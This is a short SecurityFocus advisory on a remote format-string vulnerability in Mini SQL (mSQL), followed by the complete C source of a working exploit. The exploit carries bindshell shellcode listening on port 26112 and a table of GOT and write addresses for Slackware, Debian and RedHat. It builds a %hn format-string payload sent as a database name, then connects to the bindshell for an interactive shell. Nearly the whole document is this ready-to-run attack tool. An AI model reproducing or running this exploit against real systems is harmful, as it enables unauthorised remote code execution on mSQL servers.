source: http://www.securityfocus.com/bid/8295/info

Mini SQL (mSQL) has been reported prone to a remotely exploitable format string vulnerability, when handling user-supplied data.

Reportedly a remote attacker may send malicious format specifiers to trigger the issue. This vulnerability could permit a remote attacker to corrupt arbitrary locations in memory with attacker-supplied data, potentially allowing for execution of arbitrary code.

/* _ ________ _____ ______
 __ ___ ____ /____.------` /_______.------.___.----` ___/____ _______
 _/ \ _ /\ __. __// ___/_ ___. /_\ /_ | _/
 ___ ._\ . \\ /__ _____/ _ / \_ | /__ | _| slc | _____ _
  - -------\______||--._____\---._______//-|__ //-.___|----._____||
   / \ /
     \/
[*] mSQL < remote gid root exploit
 by lucipher & The Itch (www.netric.org|be)

------------------------------------------------------------------------------

[*] Exploits a format string hole in mSQL.

[*] Some functions are taken from mSQL's sourcecode

 Copyright (c) 2003 Netric Security and lucipher
 All rights reserved.

 THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR IMPLIED
 WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
 MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
*/

#include <stdio.h> /* required by fatal() */
#include <stdlib.h>
#include <stdarg.h> /* required by fatal() */
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h> /* required by errno */
#include <getopt.h> /* required by getopt() */
#include <signal.h>

#define PKT_LEN (128*1024)
#define ERR_BUF_LEN 200
#define resetError() bzero(msqlErrMsg,sizeof(msqlErrMsg))
#define chopError() { char *cp; cp = msqlErrMsg+strlen(msqlErrMsg) -1; \
    if (*cp == '\n') *cp = 0;}

#define NET_READ(fd,b,l) read(fd,b,l)
#define NET_WRITE(fd,b,l) write(fd,b,l)

#define SERVER_GONE_ERROR "server has gone...\n"
#define UNKNOWN_ERROR "foo!"

static char msqlErrMsg[200];
static u_char packetBuf[PKT_LEN + 4];
static int readTimeout;
u_char *packet = NULL;

int netReadPacket(int fd);
int netWritePacket(int fd);

/* bindshell shellcode */
char linux_code[78] = /* binds on port 26112 */
  "\x31\xdb\xf7\xe3\x53\x43\x53"
  "\x6a\x02\x89\xe1\xb0\x66\x52"
  "\x50\xcd\x80\x43\x66\x53\x89"
  "\xe1\x6a\x10\x51\x50\x89\xe1"
  "\x52\x50\xb0\x66\xcd\x80\x89"
  "\xe1\xb3\x04\xb0\x66\xcd\x80"
  "\x43\xb0\x66\xcd\x80\x89\xd9"
  "\x93\xb0\x3f\xcd\x80\x49\x79"
  "\xf9\x52\x68\x6e\x2f\x73\x68"
  "\x68\x2f\x2f\x62\x69\x89\xe3"
  "\x52\x53\x89\xe1\xb0\x0b\xcd"
  "\x80";

static void intToBuf(cp, val)
u_char *cp;
int val;
{
  *cp++ = (unsigned int) (val & 0x000000ff);
  *cp++ = (unsigned int) (val & 0x0000ff00) >> 8;
  *cp++ = (unsigned int) (val & 0x00ff0000) >> 16;
  *cp++ = (unsigned int) (val & 0xff000000) >> 24;
}

static int bufToInt(cp)
u_char *cp;
{
  int val;

  val = 0;
  val = *cp++;
  val += ((int) *cp++) << 8;
  val += ((int) *cp++) << 16;
  val += ((int) *cp++) << 24;
  return (val);
}

int netWritePacket(fd)
int fd;
{
  int len, offset, remain, numBytes;

  len = strlen((char *) packet);
  intToBuf(packetBuf, len);
  offset = 0;
  remain = len + 4;
  while (remain > 0) {
  numBytes = NET_WRITE(fd, packetBuf + offset, remain);
  if (numBytes == -1) {
  return (-1);
  }
  offset += numBytes;
  remain -= numBytes;
  }
  return (0);
}

int netReadPacket(fd)
int fd;
{
  u_char buf[4];
  int len, remain, offset, numBytes;

  remain = 4;
  offset = 0;
  numBytes = 0;
  readTimeout = 0;
  while (remain > 0) {
  /*
   ** We can't just set an alarm here as on lots of boxes
   ** both read and recv are non-interuptable. So, we
   ** wait till there something to read before we start
   ** reading in the server (not the client)
   */
  if (!readTimeout) {
  numBytes = NET_READ(fd, buf + offset, remain);
  if (numBytes < 0 && errno != EINTR) {
    fprintf(stderr,
    "Socket read on %d for length failed : ",
    fd);

    perror("");
  }
  if (numBytes <= 0)
    return (-1);
  }
  if (readTimeout)
  break;
  remain -= numBytes;
  offset += numBytes;

  }
  len = bufToInt(buf);
  if (len > PKT_LEN) {
  fprintf(stderr, "Packet too large (%d)\n", len);
  return (-1);
  }
  if (len < 0) {
  fprintf(stderr, "Malformed packet\n");
  return (-1);
  }
  remain = len;
  offset = 0;
  while (remain > 0) {
  numBytes = NET_READ(fd, packet + offset, remain);

  if (numBytes <= 0) {
  return (-1);
  }
  remain -= numBytes;
  offset += numBytes;
  }
  *(packet + len) = 0;
  return (len);
}

int msqlSelectDB(int sock, char *db)
{
  memset(msqlErrMsg, 0x0, sizeof(msqlErrMsg));

  packet = packetBuf+4;

  snprintf(packet, PKT_LEN, "%d:%s\n", 2, db);
  netWritePacket(sock);
  if (netReadPacket(sock) <= 0) {
  strcpy(msqlErrMsg, SERVER_GONE_ERROR);
  return (-1);
  }
  if (atoi(packet) == -1) {
  char *cp;

  cp = (char *) index(packet, ':');
  if (cp) {
  strcpy(msqlErrMsg, cp + 1);
  chopError();
  } else {
  strcpy(msqlErrMsg, UNKNOWN_ERROR);
  }
  return (-1);
  }

  return (0);
}

struct target {
 char *name; /* target description */
 unsigned long writeaddr; /* mSQL's errMsg + 18 + 8 address */
 unsigned long smashaddr; /* strcpy's GOT address */
 unsigned long pops; /* number of stack pops */
};

/* high and low words indexers */
enum { hi, lo };

/* default values. */
struct target targets[] = {
 /* name write smash pops */
 { "SlackWare 8.1 - mSQL 3.0p1", 0x80a169a, 0x080751ec, 113 },
 { "Debian 3.0 - mSQL 3.0p1", 134879034, 0x08075224, 113 },
 { "RedHat 8.0 - mSQL 3.0p1", 0x804b778, 0x08074c1c, 115 },
 { "RedHat 8.0 (II) - mSQL 3.0p1", 0x804b778, 0x08074c1c, 116 },
 { NULL, 0x0, 0x0, 0 }
};

void fatal(char *fmt, ...)
{
  char buffer[1024];
  va_list ap;

  va_start(ap, fmt);
  vsnprintf(buffer, sizeof (buffer) - 1, fmt, ap);
  va_end(ap);

  fprintf(stderr, "%s", buffer);
  exit(1);
}

/* resolve a given hostname */
unsigned long tcp_resolv(char *hostname)
{
  struct hostent *he;
  unsigned long addr;
  int n;

  he = gethostbyname(hostname);
  if (he == NULL) {
  n = inet_aton(hostname, (struct in_addr *) addr);
  if (n < 0)
  fatal("inet_aton: %s\n", strerror(errno));

  return addr;
  }

  return *(unsigned long *) he->h_addr;
}

/* routine to open a tcp/ip connection */
int tcp_connect(char *hostname, int port)
{
  struct sockaddr_in sin;
  int fd, n;

  sin.sin_addr.s_addr = tcp_resolv(hostname);
  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);

  fd = socket(AF_INET, SOCK_STREAM, 6);
  if (fd < 0)
  return -1;

  n = connect(fd, (struct sockaddr *) &sin, sizeof (sin));
  if (n < 0)
  return -1;

  return fd;
}

int msql_login(char *hostname, unsigned short int port)
{
 char buffer[300], *p;
 int fd, n, opt;

 fd = tcp_connect(hostname, port);
 if (fd < 0)
  fatal("[-] couldn't connect to host %s:%u\n", hostname, port);

 setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, (char *) &opt, 4);

 memset(&buffer, 0x0, sizeof(buffer));
 n = read(fd, &buffer, sizeof(buffer) - 1);
 if (n < 0)
  fatal("[-] could not read socket: %s\n", strerror(errno));

 p = (char *)&buffer + 4;
 if (atoi(p) == -1)
  fatal("[-] bad handshake received.\n");
 p++;
 if (*p != ':') p++;
 p++;
 if (*p >= '1' && *p <= '3') {
  /* send buffer size within packet. */
  buffer[0] = (unsigned int) (5UL & 0x000000ff);
  buffer[1] = (unsigned int) (5UL & 0x0000ff00) >> 8;
  buffer[2] = (unsigned int) (5UL & 0x00ff0000) >> 16;
  buffer[3] = (unsigned int) (5UL & 0xff000000) >> 24;
  /* sorta like our login. */
  buffer[4] = 'r';
  buffer[5] = 'o';
  buffer[6] = 'o';
  buffer[7] = 't';
  buffer[8] = '\n';
  buffer[9] = '\0';

  write(fd, buffer, 9);
 }

 n = read(fd, buffer, sizeof(buffer) - 1);
 if (n < 0)
  fatal("[-] client failed in handshake.\n");

 printf("[+] connected to %s -> %u\n", hostname, port);
 return fd;
}

void msql_selectdb(int fd, char *database)
{
 unsigned char buffer[300];
 unsigned int len;

 len = 117;
 buffer[0] = (unsigned char)(len & 0x000000ff);
 buffer[1] = (unsigned char)(len & 0x0000ff00) >> 8;
 buffer[2] = (unsigned char)(len & 0x00ff0000) >> 16;
 buffer[3] = (unsigned char)(len & 0xff000000) >> 24;

 snprintf(&buffer[4], sizeof(buffer) - 1, "2:%s\n", database);
 len = write(fd, &buffer[0], len);

}

void shell(int fd)
{
 char buf[512];
 fd_set rfds;
 int l;

 write(fd, "id ; uname -a\n", 14);
 while (1) {
  FD_SET(0, &rfds);
  FD_SET(fd, &rfds);
  select(fd + 1, &rfds, NULL, NULL, NULL);

  if (FD_ISSET(0, &rfds)) {
 l = read(0, buf, sizeof (buf));
 if (l <= 0) {
  perror("read user");
  exit(EXIT_FAILURE);
 }
 write(fd, buf, l);
  }

  if (FD_ISSET(fd, &rfds)) {
 l = read(fd, buf, sizeof (buf));
 if (l == 0) {
  fatal("connection closed by foreign host.\n");
 } else if (l < 0) {
  perror("read remote");
  exit (EXIT_FAILURE);
 }
 write(1, buf, l);
  }

 }
}

void usage(void)
{
 fprintf(stderr, "mSQLexploit\n\n");
 fprintf(stderr, " -l\t\tlist available targets.\n");
 fprintf(stderr, " -t target\ttarget selection.\n");
 fprintf(stderr, " *** MANUAL ATTACK ***\n");
 fprintf(stderr, " -s [addr]\tsmash address.\n");
 fprintf(stderr, " -w [addr]\twrite address.\n");
 fprintf(stderr, " -p [num]\tnumber of pops.\n");
 exit(1);
}

int main(int argc, char **argv)
{
 struct target manual;
 struct target *target = NULL;
 unsigned short port = 0, addr[2];
 unsigned char split[4];
 char *hostname, buffer[200];
 int fd, opt;

 if (argc <= 1)
  usage();

 memset(&manual, 0x00, sizeof(struct target));
 while ((opt = getopt(argc, argv, "lht:s:w:p:")) != EOF) {
  switch (opt) {
  case 't': /* pre-written target selection */
 target = &targets[atoi(optarg)];
 break;
  case 'l':
 {
 int i;
 /* iterate through the list of targets and display. */
 for (i = 0; targets[i].name; i++)
  printf("[%d] %s\n", i, targets[i].name);

 exit(1);
 }
  case 'h':
 /* print exploit usage information */
 usage();
 break; /* never reached */
  case 's':
 if (target == NULL)
  target = &manual;

 target->name = "Manual Target";
 target->smashaddr = strtoul(optarg, NULL, 16);
 break;
  case 'w':
 if (target == NULL)
  target = &manual;

 target->name = "Manual Target";
 target->writeaddr = strtoul(optarg, NULL, 16) + 0x1a;
 break;
  case 'p':
 if (target == NULL)
  target = &manual;
 target->name = "Manual Target";
 target->pops = atoi(optarg);
  }
 }

 argc -= optind;
 argv += optind;

 if (argc <= 0) {
  fatal("choose a hostname and optionally a port\n");
 } else if (argc == 1) {
  hostname = argv[0];
 } else {
  hostname = argv[0];
  port = atoi(argv[1]) & 0xff;
 }
 if (target != NULL) {
  if (!strncmp(target->name, "Manual", 6))
 if (!target->smashaddr || !target->writeaddr ||
  !target->pops)
  fatal("exploit requires pop count and "
  "smash, write addresses: use -p and -w and -s "
  "to set them\n");
 } else {
  target = &target[0];
 }

 printf("[+] attacking %s -> %u\n", hostname, (port) ? port : 1114);

 fd = msql_login(hostname, (port) ? port : 1114);

 printf("[+] name %s\n", target->name);
 printf("[+] smash %08lx\n", target->smashaddr);
 printf("[+] write %08lx\n", target->writeaddr);
 printf("[+] Now building string...\n");

 memset(&buffer, 0x0, sizeof(buffer));

 addr[lo] = (target->writeaddr & 0x0000ffff);
 addr[hi] = (target->writeaddr & 0xffff0000) >> 16;

 /* split the address */
 split[0] = (target->smashaddr & 0xff000000) >> 24;
 split[1] = (target->smashaddr & 0x00ff0000) >> 16;
 split[2] = (target->smashaddr & 0x0000ff00) >> 8;
 split[3] = (target->smashaddr & 0x000000ff);

 /* build the format string */
 if (addr[hi] < addr[lo])
  snprintf(buffer, sizeof(buffer),
  "%c%c%c%c"
  "%c%c%c%c"

  "%s"

  "%%.%du%%%ld$hn"
  "%%.%du%%%ld$hn",

  split[3] + 2, split[2], split[1], split[0],
  split[3], split[2], split[1], split[0],
  linux_code,
  addr[hi] - 0x68, target->pops,
  addr[lo] - addr[hi], target->pops + 1);
 else
  snprintf(buffer, sizeof(buffer),
    "%c%c%c%c"
    "%c%c%c%c"

    "%s"

    "%%.%du%%%ld$hn"
    "%%.%du%%%ld$hn",

    split[3] + 2, split[2], split[1], split[0],
    split[3], split[2], split[1], split[0],
    linux_code,
    addr[lo] - 0x68, target->pops,
    addr[hi] - addr[lo], target->pops + 1);

 printf("[+] Trying to exploit...\n");
 msqlSelectDB(fd, buffer);
 switch (opt = fork()) {
 case 0:
  msqlSelectDB(fd, buffer);
  exit(1);
 case -1:
  fatal("[-] failed fork()!\n");
 default:
  break;
 }

 printf("[+] sleeping...\n");
 sleep(1);
 opt = tcp_connect(hostname, 26112);
 if (opt < 0)
  fatal("[-] failed! couldn't connect to bindshell!\n");

 printf("[+] shell!\n");
 shell(opt);

 return 0;
}